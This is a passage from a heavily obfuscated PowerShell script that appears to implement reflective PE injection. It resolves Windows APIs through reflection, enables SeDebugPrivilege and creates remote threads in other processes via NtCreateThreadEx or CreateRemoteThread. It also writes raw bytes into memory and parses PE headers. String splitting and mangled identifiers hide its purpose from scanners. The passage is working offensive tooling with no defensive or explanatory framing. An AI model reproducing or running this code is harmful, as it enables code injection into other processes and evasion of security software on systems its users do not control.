		${WIN32fUn`C`TioNs} | &("{1}{0}{2}"-f 'd-Membe','Ad','r') -MemberType ("{1}{2}{3}{0}"-f 'erty','N','otePr','op') -Name ("{0}{2}{3}{1}"-f'IsWow6','ss','4P','roce') -Value ${ISwO`w64PR`OCE`Ss}
		
		${cR`eaT`E`Th`READAddr} = &("{1}{2}{3}{0}" -f 'ddress','Get','-Pro','cA') ("{0}{1}{3}{2}"-f 'Kerne','l32','dll','.') ("{2}{3}{0}{1}" -f'r','ead','Cre','ateTh')
        ${c`REA`TEtH`ReaD`Del`e`gAtE} = &("{4}{0}{1}{3}{2}"-f 'ele','ga','pe','teTy','Get-D') @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32],  ${rtb`df}.("{1}{2}{0}" -f 'ype','Ma','keByRefT').Invoke()) ([IntPtr])
        ${C`R`Ea`TEThreaD} =  ${Jk5`M`BH}::("{4}{2}{5}{1}{3}{0}{6}" -f 'nPoi','orFun','et','ctio','G','DelegateF','nter').Invoke(${CR`E`ATeT`hr`ea`daDdR}, ${CreATEt`hR`ea`dd`El`EGAtE})
		${win32`FUNct`i`o`Ns} | &("{3}{2}{1}{0}" -f'r','e','Memb','Add-') -MemberType ("{2}{1}{0}{3}"-f'e','teProp','No','rty') -Name ("{2}{1}{0}"-f'd','hrea','CreateT') -Value ${CREa`T`eTh`ReAD}
	
		${LO`C`ALfrEe`Ad`dR} = &("{1}{2}{0}{3}" -f 'Addres','Get-','Proc','s') ("{0}{1}{2}"-f'ker','nel32.dl','l') ("{1}{2}{0}{3}"-f'tualFr','V','ir','ee')
		${lOC`ALfReE`d`Eleg`AtE} = &("{0}{4}{3}{1}{2}"-f'Get-Del','p','e','y','egateT') @([IntPtr])
		${LOc`A`lf`REE} =   (Get-VAriaBle  ("{1}{0}" -f'bh','JK5m') -valUEonL)::("{8}{7}{6}{0}{3}{5}{2}{1}{4}" -f 'orFun','nPo','o','ct','inter','i','teF','a','GetDeleg').Invoke(${LO`calfreeA`DDr}, ${LOc`Al`FreeDElEG`A`Te})
		${W`IN`32FunCTiO`NS} | &("{1}{2}{0}" -f'ber','Add','-Mem') ("{2}{1}{3}{0}" -f 'y','rop','NoteP','ert') -Name ("{0}{1}"-f'Loc','alFree') -Value ${l`Oc`AlfrEE}

		return ${Win`3`2FUN`ctIoNS}
	}
	
	Function SU`B-si`gNedinTaS`Un`sign`Ed
	{
		Param(
		[Parameter(pOSItioN = 0, manDaTOrY = ${T`RUE})]
		[Int64]
		${VAl`Ue1},
		
		[Parameter(pOsItIon = 1, MAnDAtoRY = ${Tr`UE})]
		[Int64]
		${va`Lue2}
		)
		
		[Byte[]]${Val`UE1by`T`es} =  (VAriabLE ("fo"+"dYs")  )."vAL`Ue"::("{2}{1}{0}"-f'tes','tBy','Ge').Invoke(${vA`l`Ue1})
		[Byte[]]${v`AL`Ue`2bytes} =   ${FoD`yS}::("{1}{0}" -f'ytes','GetB').Invoke(${v`AlU`E2})
		[Byte[]]${fINal`By`T`Es} =   ${FOD`YS}::"ge`Tb`yteS"([UInt64]0)

		if (${v`Al`Ue1b`yTeS}."C`oUNt" -eq ${Val`Ue2B`Y`TeS}."COu`NT")
		{
			${caRrY`o`VER} = 0
			for (${i} = 0; ${i} -lt ${vAluE`1`B`ytEs}."COu`NT"; ${I}++)
			{
				${V`Al} = ${valu`E`1ByTEs}[${i}] - ${c`ArR`yOv`eR}

				if (${V`AL} -lt ${vAlUe2`BYT`es}[${I}])
				{
					${v`AL} += 256
					${Ca`RryOV`er} = 1
				}
				else
				{
					${CArrY`oV`eR} = 0
				}
				
				
				[UInt16]${s`Um} = ${v`Al} - ${VALU`e2`B`yteS}[${I}]

				${F`IN`AlByteS}[${I}] = ${S`Um} -band 0x00FF
			}
		}
		else
		{
			Throw ("{1}{0}{9}{6}{3}{8}{5}{7}{2}{4}"-f'anno','C','erent size','subtract','s','arrays',' ',' of diff',' byte','t')
		}
		
		return   ( VAriaBlE  ("FO"+"DYS")  -vALu)::("{2}{0}{1}"-f 'n','t64','ToI').Invoke(${FInaL`B`yTes}, 0)
	}
	

	Function add-siGNed`I`Nta`S`U`NsiGNEd
	{
		Param(
		[Parameter(poSITIon = 0, mAnDatORY = ${T`RuE})]
		[Int64]
		${V`A`luE1},
		
		[Parameter(PoSITiON = 1, MAndAtORy = ${T`RUE})]
		[Int64]
		${V`Alue2}
		)
		
		[Byte[]]${V`Alu`E1b`YtES} =  (  VaRIabLE ('Fo'+'DyS') )."va`LuE"::("{1}{2}{0}" -f's','Ge','tByte').Invoke(${VaLu`e1})
		[Byte[]]${vaLu`E`2By`Tes} =  (geT-VArIAbLE  ("{0}{1}"-f'fo','Dys') )."vA`luE"::("{1}{0}" -f 'tes','GetBy').Invoke(${Val`U`E2})
		[Byte[]]${Fi`N`AL`ByTes} =  (  iTeM  ("VaR"+"Iab"+"LE:fo"+"Dys"))."v`ALue"::"GE`Tb`yTEs"([UInt64]0)

		if (${v`AlU`E1BYTeS}."c`ounT" -eq ${v`A`LUe2b`Ytes}."c`OuNt")
		{
			${C`ARr`YOvEr} = 0
			for (${i} = 0; ${I} -lt ${vA`Lu`E1b`yTes}."C`ounT"; ${i}++)
			{

				[UInt16]${S`Um} = ${vaLUE1`B`y`Tes}[${I}] + ${vAluE2`By`TES}[${I}] + ${c`ArRyO`VER}

				${FIn`AlByT`Es}[${i}] = ${s`UM} -band 0x00FF
				
				if ((${s`UM} -band 0xFF00) -eq 0x100)
				{
					${c`AR`RyO`VEr} = 1
				}
				else
				{
					${c`Ar`RYOVEr} = 0
				}
			}
		}
		else
		{
			Throw ("{4}{8}{10}{0}{6}{3}{2}{5}{9}{7}{1}"-f' by','erent sizes','rrays of','a','Can',' di','te','f','not','f',' add')
		}
		
		return   ${f`oD`yS}::("{1}{0}" -f 'oInt64','T').Invoke(${fi`NA`lByTEs}, 0)
	}
	

	Function CO`mpare-VaL1`g`R`ea`TERTh`A`NVa`l`2aSuiNT
	{
		Param(
		[Parameter(POsItiOn = 0, mAnDatORy = ${T`RuE})]
		[Int64]
		${V`A`LuE1},
		
		[Parameter(POSITioN = 1, MAnDatoRy = ${tr`Ue})]
		[Int64]
		${V`A`lUE2}
		)
		
		[Byte[]]${VA`L`Ue1bYTES} =   (vARIable ("{1}{0}" -f 'ODYs','F')  )."V`Alue"::("{1}{0}" -f 's','GetByte').Invoke(${Va`LuE1})
		[Byte[]]${vAL`U`e2`ByTes} =  ${fO`DYs}::("{2}{1}{0}"-f'es','t','GetBy').Invoke(${Va`lUe2})

		if (${V`A`L`Ue1byTES}."cO`UnT" -eq ${v`AL`Ue2ByTEs}."CO`UNT")
		{
			for (${i} = ${v`Alue1B`yt`eS}."CoU`NT"-1; ${I} -ge 0; ${i}--)
			{
				if (${val`Ue1BY`TES}[${I}] -gt ${VAlue`2BY`T`es}[${I}])
				{
					return ${tr`UE}
				}
				elseif (${VA`lu`E`1bYTeS}[${i}] -lt ${V`AlUe2`By`TeS}[${I}])
				{
					return ${f`ALse}
				}
			}
		}
		else
		{
			Throw ("{5}{0}{3}{9}{11}{2}{4}{12}{6}{7}{1}{8}{10}" -f 'annot c','t s','byte a','om','r','C','ys of diffe','ren','iz','p','e','are ','ra')
		}
		
		return ${F`AL`SE}
	}
	

	Function cONVE`Rt-ui`NTt`Oi`NT
	{
		Param(
		[Parameter(pOSITiON = 0, mAndAtOrY = ${tr`Ue})]
		[UInt64]
		${Va`LUE}
		)
		
		[Byte[]]${VaLUE`B`Y`TeS} =   (  DIr  ('va'+'RiaBlE:f'+'ody'+'S'))."V`AlUE"::("{1}{0}" -f 'etBytes','G').Invoke(${v`A`LUE})
		return ( ${FoD`ys}::("{0}{2}{1}" -f'ToIn','64','t').Invoke(${v`ALUEb`YTES}, 0))
	}
	
	
	Function TEs`T-ME`mORYrAN`geValid
	{
		Param(
		[Parameter(posITioN = 0, maNdatoRy = ${t`RUe})]
		[String]
		${DEb`Ugstr`ING},
		
		[Parameter(poSiTIoN = 1, ManDaTORy = ${T`RUe})]
		[System.Object]
		${PeI`N`Fo},
		
		[Parameter(POsiTion = 2, MANDatoRY = ${T`RUE})]
		[IntPtr]
		${sTAr`TaDD`R`ess},
		
		[Parameter(parAmEtERSeTnAme = "S`Ize", poSiTIoN = 3, MaNDATORY = ${t`Rue})]
		[IntPtr]
		${s`izE}
		)
		
	    [IntPtr]${FInal`ENDad`d`RESS} = [IntPtr](&("{5}{4}{2}{0}{6}{3}{1}"-f'gn','sUnsigned','i','dIntA','dd-S','A','e') (${Star`TAD`DRESS}) (${Si`ZE}))
		
		${P`EE`N`DadDRe`Ss} = ${peIn`FO}."End`Ad`dREss"
		
		if ((&("{6}{0}{1}{5}{3}{4}{7}{2}" -f 'are-Va','l1Grea','UInt','Va','l2A','terThan','Comp','s') (${P`E`iNfo}."peHA`N`dLE") (${sTAr`TA`ddR`ESs})) -eq ${t`Rue})
		{
			Throw ('T'+'rying'+' '+'to'+' '+'w'+'rit'+'e '+'t'+'o '+'me'+'mory '+'smal'+'ler'+' '+'th'+'an '+'allo'+'cated'+' '+'add'+'ress'+' '+'ran'+'ge. '+"$DebugString")
		}
		if ((&("{7}{1}{0}{4}{6}{10}{9}{8}{5}{3}{2}" -f'e-','mpar','Int','anVal2AsU','V','Th','al1','Co','r','eate','Gr') (${finaL`en`DadDresS}) (${p`eeND`Ad`drESS})) -eq ${T`RUe})
		{
			Throw ('Tryi'+'ng '+'t'+'o '+'wri'+'te '+'to'+' '+'memory'+' '+'gre'+'at'+'er '+'t'+'han '+'all'+'ocate'+'d '+'a'+'ddr'+'ess '+'range'+'.'+' '+"$DebugString")
		}
	}
	
	
	Function w`RITE-BYTE`St`o`MEM`orY
	{
		Param(
			[Parameter(POSITiOn=0, mANDaTOry = ${t`RUE})]
			[Byte[]]
			${b`YTes},
			
			[Parameter(posItiOn=1, mANDAtoRy = ${TR`Ue})]
			[IntPtr]
			${MEm`Orya`dDR`esS}
		)
	
		for (${o`Ff`sET} = 0; ${oF`F`set} -lt ${bY`TeS}."le`Ngth"; ${Of`FSet}++)
		{
			  ( Gi  ("VARiAB"+"Le"+":jK"+"5mB"+"H") )."Va`lue"::"w`Ri`Tebyte"(${MemORY`A`d`Dress}, ${Of`FS`et}, ${BY`TeS}[${o`F`Fset}])
		}
	}
	


	Function gEt-DeLEgA`Tet`Y`PE
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( pOSiTIOn = 0)]
	        [Type[]]
	        ${ParA`mEt`e`RS} = (&("{2}{0}{1}"-f'ew-','Object','N') ("{0}{2}{1}"-f'T','e[]','yp')(0)),
	        
	        [Parameter( POsitiON = 1 )]
	        [Type]
	        ${RETur`NTY`pE} = [Void]
	    )

	    ${D`OmaIn} =  ( GeT-vARiabLe  ("{1}{0}{2}" -f 'd','t','NjPz')  -VALu )::"cUrRe`N`T`dOMaiN"
	    ${dyN`A`sse`MBlY} = &("{2}{1}{0}" -f't','c','New-Obje') ("{2}{3}{7}{6}{5}{0}{1}{4}{8}"-f'on.A','ssemb','Syst','em.Re','lyN','ecti','l','f','ame')(("{2}{0}{3}{1}"-f 'e','legate','R','flectedDe'))
	    ${A`ssEMBLybUil`deR} = ${dOM`AIN}.("{0}{3}{1}{4}{2}{6}{5}" -f 'De','in','Ass','f','eDynamic','y','embl').Invoke(${D`yNAssEmB`Ly},  ${e`zC`OFk}::"R`Un")
	    ${Mod`UL`e`B`UIldeR} = ${As`S`emB`LYb`UILdeR}.("{3}{1}{2}{4}{0}"-f 'le','f','ineDynamicMo','De','du').Invoke(("{0}{3}{1}{2}" -f'InM','yMod','ule','emor'), ${F`AlSe})
	    ${T`yPe`BUIL`DEr} = ${ModuLebu`I`lD`Er}.("{2}{1}{0}{3}"-f'e','in','Def','Type').Invoke(("{0}{3}{4}{1}{2}" -f 'M','ateTyp','e','yDel','eg'), ("{7}{0}{3}{4}{2}{6}{5}{1}" -f'ass','s','ss, A',', Public, Sealed, An','siCla','toClas','u','Cl'), [System.MulticastDelegate])
	    ${cOnsT`Ru`C`TorB`U`iLdEr} = ${type`BuI`l`dER}.("{0}{2}{3}{1}" -f 'De','r','fineConstru','cto').Invoke(("{0}{2}{5}{4}{1}{3}"-f 'RTS','BySi','pecialNa','g, Public',' Hide','me,'),  (  DiR ("{2}{1}{0}" -f':iKe1','e','vArIAbL'))."v`ALue"::"St`AND`ARd", ${P`ARA`mEt`eRs})
	    ${CON`St`RUcTORB`U`iLDEr}.("{4}{5}{0}{1}{2}{3}{6}"-f 'Im','pleme','n','tationFlag','S','et','s').Invoke(("{3}{2}{1}{0}" -f 'd','ge','e, Mana','Runtim'))
	    ${metHoD`BuiL`d`eR} = ${ty`PEb`UilD`eR}.("{0}{1}{2}{3}"-f'D','efi','neMetho','d').Invoke('Invoke', ("{2}{0}{1}{5}{8}{4}{6}{7}{9}{3}"-f'lic, H','id','Pub','al','t,','eBySig, NewSl',' Vir','t','o','u'), ${R`eT`URNt`YpE}, ${pa`R`Am`EtErs})
	    ${M`et`hoDBUIld`er}.("{4}{1}{0}{2}{3}" -f'men','etImple','tationFl','ags','S').Invoke(("{1}{2}{3}{0}"-f'd','Runtime, ','Ma','nage'))
	    
	    &("{0}{1}{2}"-f 'W','rite-Ou','tput') ${Ty`pE`BUil`DER}.("{2}{0}{1}{3}" -f 'ate','T','Cre','ype').Invoke()
	}



	Function ge`T-Pr`oCAD`D`RESs
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( positiOn = 0, maNDaTOry = ${TR`Ue} )]
	        [String]
	        ${MO`DU`le},
	        
	        [Parameter( PoSItIoN = 1, ManDAToRy = ${T`RUe} )]
	        [String]
	        ${proC`eD`URE}
	    )


	    ${syStEMA`ssEm`BLy} =  (GET-chilDItEm ("{1}{2}{0}" -f 'Jpz','VarIaBle:tD','N')  )."v`ALuE"::"cU`RRE`NT`DOmAin".("{1}{2}{0}" -f'ies','G','etAssembl').Invoke() |
	        &("{0}{2}{1}"-f 'Where-','bject','O') { ${_}."g`Loba`lASSEm`Bly`C`Ache" -And ${_}."lo`c`ATion".("{1}{0}" -f 't','Spli').Invoke('\\')[-1].("{1}{0}"-f 'ls','Equa').Invoke(("{1}{0}{3}{2}" -f 'y','S','ll','stem.d')) }
	    ${Un`SaFe`N`Ati`VEMe`THo`DS} = ${s`Ys`TeMa`sS`EmBLy}.("{0}{1}" -f 'GetTyp','e').Invoke(("{2}{1}{7}{0}{3}{4}{8}{5}{6}" -f 'n','oft.Win','Micros','saf','eNativ','eth','ods','32.U','eM'))

	    ${g`E`TMoDuLeha`NDLe} = ${U`Ns`Afen`A`TIVeMet`hOdS}.("{0}{2}{1}" -f 'Get','thod','Me').Invoke(("{2}{0}{1}"-f 'uleHan','dle','GetMod'))
	    ${GETp`Ro`C`ADdREss} = ${U`N`Saf`e`Nat`IVemEt`hODs}.("{1}{0}{2}"-f'et','GetM','hod').Invoke(("{4}{0}{2}{1}{3}" -f 't','es','ProcAddr','s','Ge'))

	    ${KER`N3`2hANd`Le} = ${g`eTMOduLeH`AN`DLE}."In`VOKe"(${Nu`LL}, @(${mO`DUlE}))
	    ${T`Mpp`TR} = &("{0}{2}{3}{1}" -f 'New-O','t','b','jec') ("{1}{2}{0}" -f 'Ptr','In','t')
	    ${HA`Nd`lEref} = &("{2}{0}{3}{1}" -f'Obje','t','New-','c') ("{7}{3}{2}{8}{1}{5}{0}{6}{4}"-f 'd','es','teropS','ystem.Runtime.In','eRef','.Han','l','S','ervic')(${tM`PpTR}, ${k`eRN32h`A`NDLE})


	    &("{1}{2}{3}{0}" -f't','Wri','te-Ou','tpu') ${g`E`TpR`Ocaddre`Ss}."I`NVOke"(${N`ULL}, @([System.Runtime.InteropServices.HandleRef]${haN`DL`erEf}, ${Pr`o`C`EdUre}))
	}
	
	
	Function enaBLE-SeD`EB`U`gprI`VIlE`gE
	{
		Param(
		[Parameter(POSITIoN = 1, mAnDaTOrY = ${t`Rue})]
		[System.Object]
		${W`in3`2FUNctIO`NS},
		
		[Parameter(poSitIon = 2, Mandatory = ${t`Rue})]
		[System.Object]
		${w`iN32`T`ypes},
		
		[Parameter(PoSiTioN = 3, MANdaTorY = ${T`RUE})]
		[System.Object]
		${WIN32`cOns`TaN`Ts}
		)
		
		[IntPtr]${THr`eADh`ANDlE} = ${WiN32`F`Un`cTioNS}."gEt`cUrr`en`T`ThrEad"."inv`okE"()
		if (${ThrE`Adh`AN`D`le} -eq   (  chIlDIteM ("{0}{2}{1}"-f 'VAR',':Jp7d','iable')  )."vaL`Ue"::"z`eRo")
		{
			Throw ("{1}{6}{12}{7}{3}{13}{2}{11}{0}{5}{10}{8}{9}{4}" -f' ','Un',' handl','th','ead','to','ab','e to get ','u','rrent thr',' the c','e','l','e')
		}
		
		[IntPtr]${THrEADtO`k`en} =  ${j`p7d}::"ZE`RO"
		[Bool]${rE`Su`LT} = ${w`iN`32fun`Ct`ions}."oPeN`Th`ReADt`OkEn"."Inv`oke"(${thrEAdH`A`NDlE}, ${WIN`32c`o`NST`ANTs}."TokE`N`_Q`UERy" -bor ${w`iN`32co`N`stAnTS}."t`OKeN_AdJUst_p`RI`V`ILE`GEs", ${faL`se}, [Ref]${th`ReaD`TOkEn})
		if (${reS`ULt} -eq ${fa`lSe})
		{
			${ERrO`RCO`DE} =   ( GEt-vaRiAbLe  ("{0}{2}{1}"-f'jK5','bh','m')  -vaLUE)::("{4}{2}{1}{3}{0}"-f 'Error','n','LastWi','32','Get').Invoke()
			if (${eRRor`C`ode} -eq ${wI`N32CO`Ns`Ta`NTs}."ERRoR`_nO_T`oK`EN")
			{
				${R`esuLT} = ${wi`N`3`2fUNC`TiOns}."Im`perSona`TeSelf"."I`NvOKe"(3)
				if (${r`Esu`LT} -eq ${fAl`SE})
				{
					Throw ("{6}{7}{0}{5}{3}{4}{1}{2}"-f' ','s','elf','o ','impersonate ','t','Unabl','e')
				}
				
				${re`SU`LT} = ${wIn32`F`UNCt`IoNs}."O`pENtHrEAD`T`oK`EN"."I`NVoKe"(${T`Hr`eAd`haN`dlE}, ${Win32`cO`N`sTA`Nts}."ToKe`N_q`UE`RY" -bor ${wI`N32c`oNsTANtS}."T`okeN`_`Ad`JUsT_PRiV`I`lEgES", ${F`AL`Se}, [Ref]${T`hREadT`Oken})
				if (${rEsU`Lt} -eq ${f`AlSe})
				{
					Throw ("{2}{3}{1}{4}{5}{0}" -f 'enThreadToken.','e t','Una','bl','o O','p')
				}
			}
			else
			{
				Throw ('Un'+'a'+'ble '+'to'+' '+'O'+'p'+'enThreadToken.'+' '+'Err'+'or '+'cod'+'e: '+"$ErrorCode")
			}
		}
		
		[IntPtr]${p`l`Uid} =   (  chilDiTeM  ("VA"+"RIaBLE:jK"+"5"+"mBH")  )."VAL`Ue"::("{2}{0}{3}{1}"-f 'c','Global','Allo','H').Invoke( ( Get-VarIaBLE ("{0}{1}" -f'jk5M','BH') -VALU)::"SizE`OF"([Type]${wIN32t`yP`eS}."lu`Id"))
		${ReSU`Lt} = ${WI`N3`2funC`TI`oNS}."LOoKUpPR`IVileG`e`VaLUE"."In`V`oKE"(${nU`LL}, ("{1}{0}{4}{3}{2}"-f'Pr','SeDebug','lege','i','iv'), ${PL`U`Id})
		if (${ReS`U`LT} -eq ${fA`Lse})
		{
			Throw ("{4}{3}{1}{6}{7}{0}{2}{5}"-f'l','ook','egeVa','le to call L','Unab','lue','u','pPrivi')
		}

		[UInt32]${tok`enPr`ivSi`Ze} =   ( GEt-varIabLe ("{0}{1}"-f'JK5','mBH')  -vAlUE  )::"sIz`e`OF"([Type]${WI`N3`2tY`PeS}."TO`ken_`P`RiVi`LEg`es")
		[IntPtr]${To`KENpR`IVI`LEg`e`SMeM} =  ( VARIABLe  ("{0}{2}{1}"-f'jK','h','5Mb')  )."VAL`Ue"::("{1}{3}{0}{2}" -f 'HGl','Allo','obal','c').Invoke(${TOkEn`pr`iv`sIzE})
		${TOkEnp`RIVI`LE`ges} =  ${J`K5m`BH}::"pTr`ToStRuCT`U`RE"(${ToKeNPR`ivilEgE`S`M`Em}, [Type]${WIN3`2T`Yp`Es}."TO`keN`_PriV`ILEgeS")
		${tOK`ENP`RiVIl`eG`Es}."p`RivilEg`e`cOUNT" = 1
		${t`O`KeNP`R`iVIlEgES}."p`RI`ViLEG`Es"."LU`iD" =   ( diR  ("VaRi"+"A"+"blE:jk5mBH")  )."v`AlUe"::"Ptrt`OstR`UCTu`Re"(${p`LUid}, [Type]${Wi`N32TY`PEs}."l`Uid")
		${toKEn`prIviLE`gEs}."pRi`VIl`e`Ges"."ATT`R`Ib`UTES" = ${WiN`3`2cONS`T`ANTs}."sE_pRIV`Il`EGe_EnaB`L`ed"
		  (CHILdItEm ('VarIAbLe'+':'+'Jk5mBh') )."Val`Ue"::("{1}{0}{2}{4}{3}"-f'tru','S','ctur','tr','eToP').Invoke(${T`Ok`eNPRiViL`egeS}, ${TOkeN`PRIV`iLE`gESmEM}, ${T`RuE})

		${r`eSult} = ${W`iN32`FuNc`TIOns}."aDJuS`T`TOK`EnPrIvIlEgEs"."INvo`ke"(${ThRE`AdT`o`kEN}, ${fA`LsE}, ${ToK`eNpRivIl`eg`Es`m`Em}, ${To`KE`NpRI`VSIZe},  ${j`p7d}::"Z`ErO",   ${j`p7d}::"zE`Ro")
		${err`ORC`ode} =   (  variabLE  ("{0}{1}{2}"-f'Jk','5m','BH')  )."VaL`UE"::("{2}{3}{0}{1}" -f'tWin32E','rror','GetL','as').Invoke() 
		if ((${r`eS`Ult} -eq ${f`A`LSE}) -or (${E`RrO`RCOde} -ne 0))
		{
		}
		
		 ( gEt-variABLe ("{0}{1}"-f 'Jk5','mBH') -ValUeoN )::("{1}{2}{0}"-f 'l','Fre','eHGloba').Invoke(${TokEnPr`I`VILeg`e`Sm`EM})
	}
	
	
	Function IN`VOKe-Cr`eateremOteT`Hre`Ad
	{
		Param(
		[Parameter(posItIon = 1, mandatOrY = ${tr`UE})]
		[IntPtr]
		${prO`ce`SShAnd`lE},
		
		[Parameter(posiTIoN = 2, maNdAToRy = ${Tr`Ue})]
		[IntPtr]
		${s`TARta`DdresS},
		
		[Parameter(POSItIOn = 3, manDAtoRY = ${fAL`Se})]
		[IntPtr]
		${a`RGuM`enTp`Tr} =   (GCI  ("{3}{1}{2}{0}" -f 'D','a','RIABlE:Jp7','v'))."vaL`Ue"::"z`ERO",
		
		[Parameter(PoSition = 4, mAndAToRy = ${Tr`UE})]
		[System.Object]
		${WIn3`2fUNc`T`i`ons}
		)
		
		[IntPtr]${ReMOteTHR`EA`D`h`ANDLE} =   ( GeT-vAriaBLe ("{1}{0}"-f'P7D','J') )."v`AlUe"::"Z`eRo"
		
		${os`VErS`iOn} =   (  GET-VaRiABLE  ("{0}{1}"-f'd7','I9')  -VAluEo)::"o`sverSi`ON"."VE`Rs`ioN"
		if ((${o`Sve`RsiON} -ge (&("{2}{0}{1}"-f'w','-Object','Ne') ("{0}{2}{1}"-f'Ve','on','rsi') 6,0)) -and (${os`VerSI`oN} -lt (&("{2}{1}{0}"-f 'ect','-Obj','New') ("{0}{1}{2}" -f 'V','e','rsion') 6,2)))
		{
			&("{3}{0}{2}{1}"-f '-Ve','e','rbos','Write') ('W'+'indow'+'s '+'Vista'+'/'+'7 '+'det'+'e'+'cted, '+'u'+'si'+'ng '+'NtCr'+'eateThreadE'+'x.'+' '+'Addr'+'es'+'s '+'o'+'f '+'thre'+'ad'+': '+"$StartAddress")
			${rE`T`VaL}= ${Win`3`2f`UN`cTioNs}."nTCR`eATE`T`hrEaD`EX"."in`Voke"([Ref]${RE`m`otethREadHan`DLE}, 0x1FFFFF,   (GCi ("VaRIa"+"b"+"l"+"E:jp"+"7D")  )."val`Ue"::"z`ERo", ${pRO`C`es`sh`ANdlE}, ${Sta`RtaDdr`ESS}, ${aRGume`N`TPTR}, ${F`A`lsE}, 0, 0xffff, 0xffff,   (Get-CHILDIteM  ("{3}{2}{1}{0}"-f'jP7d','ble:','a','vari'))."vAL`Ue"::"zE`RO")
			${LAs`T`eRR`or} =   ${Jk5`M`Bh}::("{3}{1}{2}{0}{5}{4}" -f 'in32Er','st','W','GetLa','or','r').Invoke()
			if (${ReMo`Te`Thr`EaDhan`DLe} -eq  ${Jp`7D}::"Z`erO")
			{
				Throw ('Erro'+'r '+'in'+' '+'N'+'tC'+'r'+'eateThrea'+'d'+'Ex. '+'Re'+'tu'+'rn '+'valu'+'e: '+"$RetVal. "+'La'+'st'+'Er'+'ror: '+"$LastError")
			}
		}
		else
		{
			&("{2}{3}{1}{0}"-f'se','rbo','Wr','ite-Ve') ('Windo'+'ws '+'XP/8'+' '+'d'+'et'+'ected, '+'using'+' '+'Cr'+'eateRemo'+'te'+'T'+'hrea'+'d. '+'Add'+'r'+'ess '+'of'+' '+'th'+'rea'+'d: '+"$StartAddress")
			${rEMo`TET`H`Re`ADhANDlE} = ${wIN32FU`NcTi`ons}."C`ReaTeRE`Mot`et`hreaD"."i`NVOKE"(${pRo`c`esshA`Nd`le},  (  GEt-CHIlDiTEM ("va"+"riaBlE:"+"jp7"+"D"))."v`AluE"::"zE`RO", [UIntPtr][UInt64]0xFFFF, ${STArTA`D`dr`E`sS}, ${AR`g`UmENT`PTR}, 0,   ( GET-ITEm ('vA'+'r'+'IAble:Jp7D')  )."vaL`Ue"::"Z`erO")
		}
		
		if (${R`EmOt`EthREa`DhandlE} -eq  ${JP`7d}::"ze`Ro")
		{
			&("{1}{3}{2}{0}"-f'ose','Write','rb','-Ve') ("{0}{1}{7}{2}{5}{10}{9}{8}{6}{3}{4}"-f'Erro','r creat','ng','ndle i','s null',' remote','thread ha','i','ead, ','hr',' t')
		}
		
		return ${re`MotETHReA`D`haNd`Le}
	}

	

	Function get`-IMag`en`ThEADE`Rs
	{
		Param(
		[Parameter(POsITIOn = 0, mandAtorY = ${T`RUE})]
		[IntPtr]
		${pe`Ha`N`DLe},
		
		[Parameter(POsiTiOn = 1, maNdaTory = ${tr`Ue})]
		[System.Object]
		${Win32`T`YPeS}
		)
		
		${nT`HEadErsI`NfO} = &("{0}{3}{2}{1}" -f 'New-O','t','jec','b') ("{2}{1}{0}" -f 'ect','ystem.Obj','S')
		
		${d`oSHeAD`ER} =  ( gci  ('va'+'r'+'iABle:jk'+'5mBh'))."VA`lue"::"pTR`TOsTRuC`Ture"(${Pe`hAN`Dle}, [Type]${wI`N3`2`TYpES}."imA`gE`_do`s_heaDer")

		[IntPtr]${nT`hE`A`DErsP`Tr} = [IntPtr](&("{5}{2}{1}{4}{3}{0}" -f'd','ignedIntAsUnsi','dd-S','ne','g','A') ([Int64]${PE`ha`NdLe}) ([Int64][UInt64]${Do`ShEad`Er}."E_l`FaNEw"))
		${NT`He`ADEr`Si`NFO} | &("{2}{1}{0}" -f 'ber','m','Add-Me') -MemberType ("{1}{3}{2}{0}" -f 'ty','No','er','teProp') -Name ("{1}{2}{0}"-f 'Ptr','NtHead','ers') -Value ${NThEA`D`eR`SpTR}
		${IM`AGEN`THEa`DERS64} =  ${JK`5`mBh}::"pt`RTOS`TrUc`Ture"(${nThea`d`eRSPTr}, [Type]${wIN3`2t`yp`Es}."i`magE`_nt_hEA`d`Ers64")
		
	    if (${i`MaG`en`TH`Ea`dERs64}."Si`GNATu`RE" -ne 0x00004550)
	    {
	        throw ("{9}{4}{0}{6}{8}{5}{1}{2}{7}{3}" -f 'id ','R ','s','e.','val','E','IMAG','ignatur','E_NT_HEAD','In')
	    }
		
		if (${I`MAg`E`NTHeadeRs64}."optIo`NAl`H`ead`er"."Ma`giC" -eq ("{4}{5}{6}{7}{1}{8}{0}{2}{3}" -f'MA','IONAL_','GI','C','IM','AGE_N','T_O','PT','HDR64_'))
		{
			${nTheA`DE`R`sINFO} | &("{0}{2}{1}"-f 'A','ber','dd-Mem') -MemberType ("{1}{0}{3}{2}" -f 'P','Note','rty','rope') -Name ("{0}{1}{4}{2}{3}" -f'IMAGE_N','T','EADER','S','_H') -Value ${ImA`gENT`HEaDE`RS64}
			${NtH`eADe`Rs`iN`Fo} | &("{2}{0}{1}" -f '-M','ember','Add') -MemberType ("{0}{2}{1}" -f 'NotePro','rty','pe') -Name ("{0}{1}" -f'PE64Bi','t') -Value ${T`Rue}
		}
		else
		{
			${iMagent`HEAD`ERS`32} =  ( VaRiabLe  ('jk5'+'MBH')  -valUeO )::"PtRtO`Str`U`Cture"(${ntH`EADer`sp`TR}, [Type]${W`in32`TYPes}."i`MA`gE_NT_`Head`erS32")
			${NT`HeAdE`RSI`NfO} | &("{2}{0}{1}"-f 'd-','Member','Ad') -MemberType ("{0}{1}{2}"-f'NoteP','r','operty') -Name ("{3}{0}{1}{2}{4}"-f'GE_N','T_H','EAD','IMA','ERS') -Value ${i`maGEnThEAD`Er`S32}
			${nTHEa`deR`SIN`Fo} | &("{0}{2}{1}" -f'Add','mber','-Me') -MemberType ("{1}{2}{0}"-f 'ty','Note','Proper') -Name ("{2}{1}{0}" -f 'it','4B','PE6') -Value ${FaL`SE}
		}
		
		return ${N`T`Hea`dErSi`Nfo}
	}


	Function gEt`-P`e`BaSI`cInfO
	{
		Param(
		[Parameter( PoSitION = 0, MAnDATORY = ${T`Rue} )]
		[Byte[]]
		${P`e`ByTES},
		
		[Parameter(posItION = 1, MaNdATORy = ${t`Rue})]
		[System.Object]
		${wIn`32`TyPES}
		)
		
		${pEin`Fo} = &("{2}{1}{0}" -f 'ct','bje','New-O') ("{1}{2}{0}{3}" -f'b','Syst','em.O','ject')
		
